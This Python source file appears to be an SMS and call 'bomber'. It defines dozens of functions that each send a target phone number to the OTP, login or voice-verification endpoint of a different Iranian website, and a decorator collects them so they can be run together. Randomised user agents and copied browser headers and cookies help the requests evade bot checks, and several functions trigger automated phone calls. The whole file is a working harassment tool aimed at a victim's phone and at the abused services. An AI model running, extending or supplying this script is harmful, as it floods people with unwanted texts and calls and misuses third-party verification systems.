import requests
from fake_useragent import UserAgent

wrapped_api_functions = []  
def error_handler(func):
    def wrapper(*args, **kwargs):
        try:
            print(f"✅ SENT BY API {func.__name__}")
            return func(*args, **kwargs)
        except Exception as error:
            print(f"⚠️ ERROR IN API {func.__name__}: {error}")
    wrapped_api_functions.append(wrapper) 
    return wrapper

@error_handler
def basalam(phone):
    url = "https://auth.basalam.com/captcha/otp-request"
    ua = UserAgent()
    
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "User-Agent": ua.random,
    }

    data = {
        "mobile": phone,
        "client_id": "11"
    }

    response = requests.post(url, headers=headers, json=data)

@error_handler
def snapp(phone):
    url = "https://api.snapp.ir/api/v1/sms/link"
    ua = UserAgent()
    
    headers = {
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-phoneve",
    "Content-Length": "23",
    "Content-Type": "application/json",
    "Host": "api.snapp.ir",
    "Origin": "https://snapp.ir",
    "Referer": "https://snapp.ir/",
    "sec-ch-ua": '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "User-Agent": ua.random,
    }

    data = {
        "phone": phone,
    }
    response = requests.post(url, headers=headers, json=data)

@error_handler
def trob(phone):
    url = f"https://api.torob.com/v4/user/phone/send-pin/?phone_phoneber={phone}"
    ua = UserAgent()
    
    headers = {
        "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-phoneve",
    "Cookie": "display_mode=; deliver_city=68; deliver_city_name=%D8%A7%D8%B1%D9%88%D9%85%DB%8C%D9%87; is_torob_user_logged_in=False; _ga=GA1.1.1986317626.1739650875; _ga_RWKMFFVXJX=GS1.1.1739650874.1.0.1739650874.0.0.0",
    "Host": "api.torob.com",
    "Origin": "https://torob.com",
    "Referer": "https://torob.com/",
    "sec-ch-ua": '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "User-Agent":ua.random,
    }

    response = requests.get(url, headers=headers)

@error_handler
def phonebaba(phone):
    url = "https://ws.phonebaba.ir/api/v3/account/mobile/otp"
    ua = UserAgent()
    
    headers = {
    "ab-alohomora": "soqNimTk83tjfiKnf5BMAU",
    "ab-channel": "WEB-NEW,PRODUCTION,CSR,www.phonebaba.ir,desktop,Chrome,132.0.0.0,N,N,Windows,10,3.117.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-phoneve",
    "Content-Length": "28",
    "Content-Type": "application/json",
    "Host": "ws.phonebaba.ir",
    "Origin": "https://www.phonebaba.ir",
    "Referer": "https://www.phonebaba.ir/",
    "sec-ch-ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\", \"Google Chrome\";v=\"132\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "tracing-device": "N,Chrome,132.0.0.0,N,N,Windows",
    "tracing-sessionid": "1739651872183",
    "User-Agent": ua.random,
    }

    data = {
        "phonephoneber": str(phone)[1:],
    }
    response = requests.post(url, headers=headers, json=data)

@error_handler
def mrbilit(phone):
    url = f"https://auth.mrbilit.ir/api/Token/send?mobile={phone}"
    response = requests.get(url)

@error_handler
def balad(phone):
    url = "https://account.api.balad.ir/api/web/auth/login/"
    ua = UserAgent()
    
    headers = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-phoneve",
    "Content-Length": "44",
    "Content-Type": "application/json",
    "device-id": "63bdd23e-2592-40ab-8c0c-ca3ba8cb872b",
    "Host": "account.api.balad.ir",
    "Origin": "https://balad.ir",
    "Referer": "https://balad.ir/",
    "sec-ch-ua": '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "User-Agent": ua.random,
    }

    data = {
        "phone_phoneber": phone,
        "os_type": "W"
    }
    response = requests.post(url, headers=headers, json=data)

@error_handler
def ostadkar(phone):
    url = "https://api.ostadkr.com/login"
    data = {
        "mobile": phone,
    }
    response = requests.post(url, json=data)

@error_handler
def behtarino(phone):
    url = "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/"
    ua = UserAgent()
    
    headers = {
    "Accept": "application/json",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.5",
    "Cache-Control": "no-cache",
    "Connection": "keep-phoneve",
    "Content-Length": "23",
    "Content-Type": "application/json",
    "Host": "bck.behtarino.com",
    "Origin": "https://behtarino.com",
    "Pragma": "no-cache",
    "Priority": "u=0",
    "Referer": "https://behtarino.com/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "no-cors",
    "Sec-Fetch-Site": "same-site",
    "Site": "behtarino",
    "TE": "trailers",
    "User-Agent": ua.random,
    }

    data = {
        "phone": phone,
    }
    response = requests.post(url, headers=headers, json=data)

@error_handler
def nobatir(phone):
    url = "https://api.nobat.ir/patient/login/phone"
    data = {
    "mobile": phone
    }
    response = requests.post(url, json=data)

@error_handler
def bit24(phone):
    url = f"https://bit24.cash/auth/api/sso/v2/users/auth/check-user-registered?country_code=98&mobile={phone}"
    response = requests.get(url)

@error_handler
def drdr(phone):
    url = "https://drdr.ir/api/v3/auth/login/mobile/init/"
    ua = UserAgent()
    
    headers = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9",
    "baggage": "sentry-environment=production,sentry-release=UqAqYuh_1lCtBmJmxksmx,sentry-public_key=66fa36fe2d7c4491900085ef02808f39,sentry-trace_id=30a7e31578f74db3b9a8bce9e6a0077b",
    "client-id": "f60d5037-b7ac-404a-9e3a-a263fd9f8054",
    "Connection": "keep-phoneve",
    "Content-Length": "24",
    "Content-Type": "application/json",
    "Cookie": "_gcl_au=1.1.1584979059.1739894928; _ga=GA1.1.1375027917.1739894929; _ga_0Y8NF1G4YD=GS1.1.1739894928.1.1.1739894969.0.0.0",
    "Host": "drdr.ir",
    "Origin": "https://drdr.ir",
    "Referer": "https://drdr.ir/",
    "sec-ch-ua": '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "sentry-trace": "30a7e31578f74db3b9a8bce9e6a0077b-9ec6d096016d863f",
    "User-Agent":  ua.random,
    }

    data = {
        "mobile": phone,
    }
    response = requests.post(url, headers=headers, json=data)

@error_handler
def drto(phone):
    url = "https://api.doctoreto.com/api/web/patient/v1/accounts/register"
    ua = UserAgent()
    
    headers = {
    "Accept": "application/json",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9",
    "app-version": "2.0.0",
    "Connection": "keep-phoneve",
    "Content-Type": "application/json",
    "Cookie": "_gcl_au=1.1.688788263.1739895798; _ga=GA1.2.108459727.1739895800; _gid=GA1.2.1160219373.1739895800; _gat_UA-81198296-1=1; _clck=13h5e8j%7C2%7Cftj%7C0%7C1875; _clsk=1t5j6ej%7C1739895804278%7C2%7C0%7Cb.clarity.ms%2Fcollect; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}",
    "Host": "api.doctoreto.com",
    "Origin": "https://doctoreto.com",
    "Referer": "https://doctoreto.com/",
    "sec-ch-ua": '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132")',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "User-Agent": ua.random
    }

    data = {
        "mobile": phone[1:],
        "country_id": 205,
        "captcha": ""
    }
    response = requests.post(url, headers=headers, json=data)

@error_handler
def okala(phone):
    url = "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister"
    data = {
    "mobile": phone,  
    "confirmTerms": True,  
    "notRobot": False,  
    "VphonedationCodeCreateReason": 5,
    "OtpApp": 0,
    "deviceTypeCode": 0,
    "IsAppOnly": False, 
    "AppVersion": None  #
    }
    response = requests.post(url, json=data)

@error_handler
def banimode(phone):
    url = "https://mobapi.banimode.com/api/v2/auth/request"
    data = {
        "phone": phone,

    }
    response = requests.post(url, json=data)

@error_handler
def pinket(phone):
    url = "https://pinket.com/api/cu/v2/phone-verification"
    data = {
        "phonephoneber": phone,
    }
    response = requests.post(url,json=data)

@error_handler
def football360(phone):
    url = "https://football360.ir/api/auth/v2/verify-phone/"
    
    data = {
        "phone_phoneber": "+98" + phone[1:],
    }
    response = requests.post(url, json=data)

@error_handler
def mrbilit(phone):
    url = f"https://auth.mrbilit.ir/api/Token/send?mobile={phone}"

    response = requests.get(url)

@error_handler
def hamrahmechanich(phone):
    url = "https://www.hamrah-mechanic.com/api/v1/membership/otp"
    data = {
        "Phonephoneber": phone,
        "prevDomainUrl": "https://www.google.com/",
        "landingPageUrl": "https://www.hamrah-mechanic.com/",
        "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
        "prevUrl": "https://www.hamrah-mechanic.com/",
        "referrer": "https://www.google.com/"
    }
    response = requests.post(url,json=data)

@error_handler
def lendo(phone):
    url = "https://api.lendo.ir/api/customer/auth/send-otp"
    ua = UserAgent()
    
    headers = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-phoneve",
    "Content-Length": "24",
    "Content-Type": "application/json",
    "Host": "api.lendo.ir",
    "Origin": "https://lendo.ir",
    "Referer": "https://lendo.ir/",
    "sec-ch-ua": '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "sha": "SIGN zoi+jy0LWm2sulYPeNtbLFhkDcJ4bpSfyHgVYXyrP/2qb8jKxISd7zgnq5vobG/PMciy5zKE/6PQzuULVdKmtQ==",
    "User-Agent": ua.random,
    }

    data = {
        "mobile": phone,
    }
    response = requests.post(url, headers=headers, json=data)

@error_handler
def fidibo(phone):
    url = "https://api.fidibo.com/identity/login/prepare"
    ua = UserAgent()
    
    headers = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9",
    "Authorization": "",
    "Connection": "keep-phoneve",
    "Content-Type": "application/json",
    "Device-Uuid": "13ee0760-eec5-11ef-96d9-e7d056a43cac",
    "Host": "api.fidibo.com",
    "Origin": "https://fidibo.com",
    "Referer": "https://fidibo.com/",
    "sec-ch-ua": '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "User-Agent": ua.random,
    }

    data = {
        "username": "98-" + phone[1:]
    }
    response = requests.post(url, headers=headers, json=data)

@error_handler
def khodro45(phone):
    url = "https://khodro45.com/api/v2/customers/otp/"

    data = {
        "mobile":phone,
    }
    response = requests.post(url, json=data)

@error_handler
def pateh(phone):
    url = "https://api.pateh.com/ath/auth/login-or-register"
    ua = UserAgent()
    
    headers = {
    "Accept": "application/json",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-phoneve",
    "Content-Type": "application/json",
    "Host": "api.pateh.com",
    "Origin": "https://www.pateh.com",
    "Referer": "https://www.pateh.com/",
    "sec-ch-ua": '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "User-Agent": ua.random,
    }

    data = {
        "mobile": phone
    }
    response = requests.post(url,headers=headers, json=data)

@error_handler
def pindo(phone):
    url = "https://api.pindo.ir/v1/user/login-register/"
    data = {
        "phone": phone,    }
    response = requests.post(url,json=data)

session = requests.Session()
@error_handler
def delino1(phone):
    url1 = "https://www.delino.com/User/PreRegister"
    ua = UserAgent()
    data1 = {
        "mobile": phone,
    }
    response = session.post(url1, data=data1)
    url = "https://www.delino.com/user/Register"
    data2 = {
        "mobile": phone,
    }
    headers2 = {
        "User-Agent":ua.random,
        "Referer": "https://www.delino.com/",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    response = session.post(url, data=data2, headers=headers2)
    url3 = "https://www.delino.com/user/call?_=1740084950054"
    response = session.get(url3)

@error_handler
def zoodex(phone):
    url = "https://admin.zoodex.ir/api/v1/login/checking"

    data = {
        "mobile": phone,
        "referrer": "zoodex.ir"
    }
    response = requests.post(url, json=data)

@error_handler
def deniizshop(phone):
    url = "https://deniizshop.com/api/v1/sessions/login_request"
 
    data = {
        "mobile_phoneber": phone,
    }
    response = requests.post(url, json=data)

@error_handler
def abantether(phone):
    url = "https://api.abantether.com/api/v2/auths/register/phone/send"
    
    data = {
         "phone_phoneber": phone,
    }
    response = requests.post(url,json=data)

@error_handler
def classino(phone):
    url = "https://app.classino.com/otp/v1/api/send_otp"

    data = {
        "mobile": phone,
    }
    response = requests.post(url, json=data)

@error_handler
def snappfood(phone):
    url = "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass"
    
    data = {
       "cellphone":phone,
       "optionalLoginToken":True,
    }
    response = requests.post(url, json=data)

@error_handler
def otaghak(phone):
    url = "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode"
    data = {
        "username": phone,
    }
    response = requests.post(url ,json=data)

@error_handler
def anargift(phone):
    url = "https://api.anargift.com/api/v1/auth/send_code"
    ua = UserAgent()
    
    headers = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9",
    "Access-Control-Allow-Origin": "*",
    "Connection": "keep-phoneve",
    "Content-Length": "24",
    "Content-Type": "application/json",
    "Host": "api.anargift.com",
    "Origin": "https://anargift.com",
    "Referer": "https://anargift.com/",
    "sec-ch-ua": '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "User-Agent": ua.random,
    }

    data = {
        "mobile": phone
    }
    response = requests.post(url, headers=headers,json=data)

@error_handler
def sibirani(phone):
    url = "https://sandbox.sibirani.com/api/v1/developer/generator-inv-token"
    data = {
        "username": phone
    
    }
    response = requests.post(url, json=data)

@error_handler
def digikala(phone):
    url = "https://api.digikala.com/v1/user/authenticate/"
    data = {
        "username": phone,

    }
    response = requests.post(url,json=data)

@error_handler
def dicardo(phone):
    url = "https://dicardo.com/main/sendsms"

    data = {
        "phone": phone,

    }
    response = requests.post(url, json=data)

@error_handler
def rojashop(phone):
    url = "https://rojashop.com/api/send-otp-register"
    data = {
        "mobile": phone ,"withOtp":1,
    }
    response = requests.post(url,json=data)

@error_handler
def khodro45(phone):
    url = "https://khodro45.com/api/v2/customers/otp/"

    data = {
        "mobile": phone,
        "device_type": 2

    }
    response = requests.post(url, json=data)

@error_handler
def virgool(phone):
    url = "https://virgool.io/api/v1.4/auth/verify"

    data = {
        "method": "phone",
        "identifier": "+98"+phone[1:]
    }
    response = requests.post(url, json=data)

@error_handler
def timcheh(phone):
    url = "https://daal.co/api/v1/authentication/login-register/method/phone-otp/user-role/customer/application"
    ua = UserAgent()
    headers={ 
    "Accept": "application/json",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9",
    "baggage": (
        "sentry-environment=production,"
        "sentry-release=871edcde720b9b8e62737c247c9090da6bac56e0,"
        "sentry-public_key=04e25823f65d4fa29bdaa18f8a91411f,"
        "sentry-trace_id=e56f66d9862f4849b73091245ed40fad,"
        "sentry-sample_rate=1,"
        "sentry-transaction=%2F,"
        "sentry-sampled=true"
    ),
    "Connection": "keep-phoneve",
    "Content-Length": "23",
    "Content-Type": "application/json",
    "Cookie": (
        "__arcsco=07ef2343c5dea1de16334681c91efc06; "
        "_bb7e3=3f1bc6cd1bf8aa34; "
        "analytics_campaign={%22source%22:%22google%22,%22medium%22:%22organic%22}; "
        "analytics_token=1c575f76-54a5-ff25-e6ae-c0c98f824af2; "
        "analytics_session_token=b92a045a-2bf4-a5e4-ebe9-768915a1da09; "
        "yektanet_session_last_activity=2/24/2025; "
        "_yngt_iframe=1; "
        "_yngt=01JMPW6ZBA2SQNQGMKDC6P8SJS; "
        "_gcl_au=1.1.413814609.1740346839; "
        "_ga=GA1.1.1362313386.1740346840; "
        "_clck=kjepod%7C2%7Cfto%7C0%7C1880; "
        "_clsk=1azr405%7C1740346843149%7C1%7..."
    ),
    "Host": "daal.co",
    "Origin": "https://daal.co",
    "Referer": "https://daal.co/",
    "sec-ch-ua": '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "sentry-trace": "e56f66d9862f4849b73091245ed40fad-89fb930927262b9a-1",
    "User-Agent":ua.random,
    }
    data = {
        "phone": phone,
    }
    response = requests.post(url, headers=headers, json=data)

@error_handler
def bimebazar(phone):
    url = "https://bimebazar.com/accounts/api/login_sec/"
    ua = UserAgent()
    
    headers = {
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9",
    "Authorization": "",  
    "Connection": "keep-phoneve",
    "Content-Length": "39",
    "Content-Type": "application/json",
    "Cookie": "__arcsco=02ad1e020c00c642c0e434b06c3f7bc7; partner_created_date=Mon Feb 24 2025 01:24:34 GMT+0330 (Iran Standard Time); partner_last_modified_date=Mon Feb 24 2025 01:24:34 GMT+0330 (Iran Standard Time); utm_data=gclid; affiliation_code=; bimebazar=kdimxsj7ueuluow77haoryyevacg5xia; _gcl_aw=GCL.1740347674.EAIaIQobChMI5oeCnuTaiwMVGppQBh094B-gEAAYASAAEgJZa_D_BwE; _gcl_gs=2.1.k1$i1740347671$u211864839; _gcl_au=1.1.776187158.1740347674; bb_partner=bb_tq11; _conv_r=s%3Agoogle*m%3Acpc%20google...",
    "Host": "bimebazar.com",
    "Origin": "https://bimebazar.com",
    "Referer": url,
    "sec-ch-ua": '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "User-Agent": ua.random,
    }

    data = {
        "username": phone,
        "type": "sms"
    }
    response = requests.post(url, headers=headers, json=data)

@error_handler
def digify(phone):
    url = "https://backend.digify.shop/user/merchant/otp/"
    ua = UserAgent()
    headers = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "fa-IR",
    "Connection": "keep-phoneve",
    "Content-Length": "30",
    "Content-Type": "application/json",
    "Cookie": "_clck=1pqgk80%7C2%7Cftp%7C0%7C1881; _hp5_event_props.283416570=%7B%7D; _hp5_meta.283416570=%7B%22userId%22%3A%22764034374075538%22%2C%22sessionId%22%3A%222588174203697968%22%2C%22sessionProperties%22%3A%7B%22time%22%3A1740401554967%2C%22referrer%22%3A%22https%3A%2F%2Flite.digify.shop%2F%22%2C%22id%22%3A%222588174203697968%22%2C%22search_keyword%22%3A%22%22%2C%22utm%22%3A%7B%22source%22%3A%22%22%2C%22medium%22%3A%22%22%2C%22term%22%3A%22%22%2C%22content%22%3A%22%22%2C%22campaign%22%3A%22%22%7D%7D",
    "Host": "backend.digify.shop",
    "Origin": "https://digify.shop",
    "Referer": "https://digify.shop/",
    "sec-ch-ua": '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "User-Agent": ua.random
    }
    data = {
          "phone_phoneber": phone
    }
    response = requests.post(url, headers=headers, json=data)

@error_handler
def snappmarket(phone):
    url = f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={phone}"

    response = requests.post(url)

@error_handler
def chartix(phone):
    url = "https://back.chartix.ir/api/v1/auth/send-otp"
    data = {
        "phone":phone,"frontToken":"d9d6255d04e431e5c249ff0db2a89ea486c25383da8f523a5f60a108f7296fd8"
    }
    response = requests.post(url, json=data)

@error_handler
def snapptrip(phone):
    url = "https://platform-api.snapptrip.com/profile/auth/request-otp"
    data = {
          "phonephoneber": phone
    }
    response = requests.post(url, json=data)


session1 = requests.Session()
@error_handler
def botaghak(phone):
    url1 = "https://core.otaghak.com/odata/Otaghak/Users/UserExists"
    data1 = {"username": phone}
    session1.post(url1, json=data1)
    url2 = "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode"
    data2 = {"username": phone, "isShortOtp": True}
    session1.post(url2, json=data2)


@error_handler
def mashinbank(phone):
    url = "https://mashinbank.com/api2/users/check"
    ua = UserAgent()
    headers = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-phoneve",
    "Content-Length": "30",
    "Content-Type": "application/json",
    "Cookie": "connect.sid=s%3Azg3nBukQ206ie60T6jitM4yZMYCwe7kz.VHfXkdLRwt%2FokumhNWsuwqPNwS3OWKa%2BHpvrj6y7Kjs; _ga=GA1.2.609865511.1741110144; _gid=GA1.2.938686629.1741110144; _gat=1; _gcl_au=1.1.771917733.1741110145; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=23ff37b2-9d25-839d-bfa6-6b4b37e0276c; analytics_session_token=cd0dbd82-11cf-10e0-689d-c76ccf934204; yektanet_session_last_activity=3/4/2025; _yngt_iframe=1; _yngt=01JNGW2VEFG9A3B1AK11JF5XN1;",
    "Host": "mashinbank.com",
    "Origin": "https://mashinbank.com",
    "Referer": "https://mashinbank.com/",
    "sec-ch-ua": '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133")',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "User-Agent":ua.random,
    }
    data = {
    "mobilephoneber": phone
    }
    response = requests.post(url,headers=headers,json=data)

@error_handler
def dastkhat(phone):
    url = "https://dastkhat-isad.ir/api/v1/user/store"
    ua = UserAgent()

    data = {
        "mobile": phone,"countryCode":98,"device_os":2
    }
    response = requests.post(url, json=data)

@error_handler
def sibbank(phone):
    url = "https://api.sibbank.ir/v1/auth/login"
    ua = UserAgent()
    headers = {

    "User-Agent": ua.random
    }
    data = {
        "phone_number" : phone,
    }
    response = requests.post(url, headers=headers, json=data)

@error_handler
def arshiyaniha(phone):
    url = "https://api6.arshiyaniha.com/api/v2/client/otp/send"
    ua = UserAgent()
    headers = {
    "User-Agent": ua.random
    }
    data = {
        "cellphone": "0"+phone,
        "country_code": "98"
    }
    response = requests.post(url, headers=headers, json=data)

@error_handler
def mci(phone):
    url = "https://ebcom.mci.ir/services/auth/v1.0/otp"
    ua = UserAgent()
    headers = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9",
    "clientId": "1006ee1c-790c-45fa-a86d-ac36846b8e87",
    "Connection": "keep-alive",
    "Content-Length": "23",
    "Content-Type": "application/json",
    "Origin": "https://shop.mci.ir",
    "Referer": "https://shop.mci.ir/",
    "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "User-Agent":ua.random
    }
    data = {
        "msisdn": phone[1:]
    }
    response = requests.post(url, headers=headers, json=data)

@error_handler
def mrbilitcall(phone):
    url = f"https://auth.mrbilit.ir/api/Token/send/byCall?mobile={phone}"
    response = requests.get(url)

@error_handler
def bimebazar1(phone):
    url = "https://bimebazar.com/accounts/api/login_sec/"
    ua = UserAgent()
    
    headers = {
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9",
    "Authorization": "",  
    "Connection": "keep-phoneve",
    "Content-Length": "39",
    "Content-Type": "application/json",
    "Cookie": "__arcsco=02ad1e020c00c642c0e434b06c3f7bc7; partner_created_date=Mon Feb 24 2025 01:24:34 GMT+0330 (Iran Standard Time); partner_last_modified_date=Mon Feb 24 2025 01:24:34 GMT+0330 (Iran Standard Time); utm_data=gclid; affiliation_code=; bimebazar=kdimxsj7ueuluow77haoryyevacg5xia; _gcl_aw=GCL.1740347674.EAIaIQobChMI5oeCnuTaiwMVGppQBh094B-gEAAYASAAEgJZa_D_BwE; _gcl_gs=2.1.k1$i1740347671$u211864839; _gcl_au=1.1.776187158.1740347674; bb_partner=bb_tq11; _conv_r=s%3Agoogle*m%3Acpc%20google...",
    "Host": "bimebazar.com",
    "Origin": "https://bimebazar.com",
    "Referer": url,
    "sec-ch-ua": '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "User-Agent": ua.random,
    }

    data = {
        "username": phone,
        "type": "call"
    }
    response = requests.post(url, headers=headers, json=data)

@error_handler
def gap(phone):
    url = f'https://core.gap.im/v1/user/resendCode.json?mobile=%2B98{phone}&type=IVR'
    response = requests.get(url)

@error_handler
def novinbook(phone):
    url = "https://novinbook.com/index.php?route=account/phone"
    ua = UserAgent()
    data = f"phone=0{phone}&call=yes"
    response = requests.post(url, data=data)
